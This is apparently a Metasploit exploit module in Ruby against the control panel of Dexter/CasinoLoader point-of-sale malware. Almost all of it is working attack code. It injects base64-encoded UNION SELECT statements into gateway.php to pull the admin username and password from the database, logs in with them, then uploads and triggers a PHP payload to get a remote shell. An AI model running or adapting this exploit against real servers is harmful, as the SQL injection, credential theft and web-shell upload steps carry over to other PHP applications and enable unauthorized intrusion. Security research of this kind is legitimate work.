# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Dexter (CasinoLoader) SQL Injection",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in the command and control panel
        used to control Dexter (Point of Sale malware).  This is done by accessing the
        PHP page used by bots to report in (gateway.php) which does not sanitize input.
        Input is encrypted and encoded, but the key is supplied by the bot connecting.
        The &#039;page&#039; parameter is used in this case.  The command and control panel designates
        a location to upload files, and can be used as a reliable location to write a
        PHP shell.  Authentication is not needed to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bwall (Brian Wallace) <bwallace[at]cylance.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [
            "URL", "http://www.xylibox.com/2013/08/point-of-sale-malware-infostealerdexter.html"
          ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;CasinoLoader gateway.php on Windows&#039;, {}],
          [&#039;CasinoLoader gateway.php on Linux&#039;,   {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Feb 08 2014"
    ))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the CasinoLoader root folder&#039;, &#039;/&#039;]),
          OptString.new(&#039;TARGETGATEWAY&#039;, [true, &#039;Name of bot gateway page&#039;, &#039;gateway.php&#039;]),
          OptString.new(&#039;TARGETLOGIN&#039;, [true, &#039;Name of panel login page&#039;, &#039;index.php&#039;]),
          OptString.new(&#039;TARGETUPLOAD&#039;, [true, &#039;Name of panel upload page&#039;, &#039;upload.php&#039;]),
          OptString.new(&#039;TARGETDATABASEUSERTABLE&#039;, [true, &#039;Table in database that holds admin data&#039;, &#039;users&#039;])
        ], self.class)
  end

  def gateway
    return normalize_uri(target_uri.path, datastore[&#039;TARGETGATEWAY&#039;])
  end

  def login
    return normalize_uri(target_uri.path, datastore[&#039;TARGETLOGIN&#039;])
  end

  def upload
    return normalize_uri(target_uri.path, datastore[&#039;TARGETUPLOAD&#039;])
  end

  def database_get_field(table, column, row)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;=>gateway,
      &#039;vars_post&#039; => {
        &#039;val&#039; => &#039;AA==&#039;,
        &#039;page&#039; => Rex::Text.encode_base64("&#039; AND 1=2 UNION ALL SELECT 1," + column + ",3 FROM " + table + " LIMIT 1 OFFSET " + row.to_s + " -- --")
      }
    })
    if res and res.headers.has_key?(&#039;Set-Cookie&#039;) and res.headers[&#039;Set-Cookie&#039;].start_with?(&#039;response=&#039;)
      return Rex::Text.decode_base64(URI.unescape(res.headers[&#039;Set-Cookie&#039;][&#039;response=&#039;.length..-1]))[1..-3]
    end
    return false
  end

  def check
    testvalue = rand_text_alpha(9)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;=>gateway,
      &#039;vars_post&#039; => {
        &#039;val&#039; => &#039;AA==&#039;,
        &#039;page&#039; => Rex::Text.encode_base64("&#039; AND 1=2 UNION ALL SELECT 1,&#039;" + testvalue + "&#039;,3 -- --")
      }
    })

    if res and res.headers.has_key?(&#039;Set-Cookie&#039;) and res.headers[&#039;Set-Cookie&#039;].start_with?(&#039;response=&#039;) and
      Rex::Text.decode_base64(URI.unescape(res.headers[&#039;Set-Cookie&#039;][&#039;response=&#039;.length..-1])) == &#039;$&#039; + testvalue + &#039;;#&#039; and database_get_field(&#039;users&#039;, &#039;name&#039;, 0) != false
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end


  def exploit
    payload_name = rand_text_alpha(rand(10) + 5) + &#039;.php&#039;

    print_status("#{peer} - Using SQL injection to acquire credentials")
    user = database_get_field(&#039;users&#039;, &#039;name&#039;, 0)
    if user == false
      print_error("#{peer} - Failed to acquire administrator username")
      return
    end

    password = database_get_field(&#039;users&#039;, &#039;password&#039;, 0)
    if password == false
      print_error("#{peer} - Failed to acquire administrator password")
    end

    print_status("#{peer} - Using #{user}:#{password}")

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;=>login,
      &#039;vars_post&#039; => {
        &#039;submit&#039; => &#039;1&#039;,
        &#039;username&#039; => user,
        &#039;password&#039; => password
      }
    })

    login_cookie = ""

    if res and res.headers.has_key?(&#039;Location&#039;)
      login_cookie = res.get_cookies
      print_status("#{peer} - Login successful")
    else
      print_error("#{peer} - Failed to log in")
      return
    end

    data = Rex::MIME::Message.new
    data.add_part("MAX_FILE_SIZE", nil, nil, &#039;form-data; name="MAX_FILE_SIZE"&#039;)
    data.add_part("<?php #{payload.encoded} ?>", nil, nil, "form-data; name=\"uploadedfile\"; filename=\"#{payload_name}\"")
    post_data = data.to_s

    print_status("#{peer} - Sending PHP payload (#{payload_name})")
    res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => upload,
        &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
        &#039;cookie&#039; => login_cookie,
        &#039;data&#039;   => post_data
    })

    if res and res.code == 200 and res.body =~ /a href="upload.php\?del=(.*)">/
      path = $1
      if target.name =~ /Linux/
        path = path.sub! "\\", "/"
      end
      target_path = normalize_uri(target_uri.path, path)
      print_status("#{peer} - Requesting: #{target_path}")
      send_request_raw({&#039;uri&#039; => normalize_uri(target_path)})
      handler
    else
      print_error("#{peer} - Failed to upload file")
      return
    end
  end
end

